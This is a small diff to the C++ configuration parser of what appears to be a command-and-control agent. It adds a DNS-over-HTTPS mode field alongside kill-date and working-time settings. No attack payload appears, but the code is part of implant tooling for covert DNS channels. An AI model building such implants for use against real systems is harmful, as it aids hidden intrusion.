@@ -125,8 +125,11 @@ AgentConfig::AgentConfig()
 	this->profile.doh.label_size  = packer->Unpack32();
 	this->profile.doh.ttl         = packer->Unpack32();
 	this->profile.doh.encrypt_key = this->encrypt_key;
+	this->profile.doh.doh_mode    = packer->UnpackBytesCopy(&length);
 
 	this->profile.mode            = packer->UnpackBytesCopy(&length);
+	this->profile.doh_mode        = packer->UnpackBytesCopy(&length);
+
 	this->listener_type           = packer->Unpack32();
 	this->kill_date               = packer->Unpack32();
 	this->working_time            = packer->Unpack32();
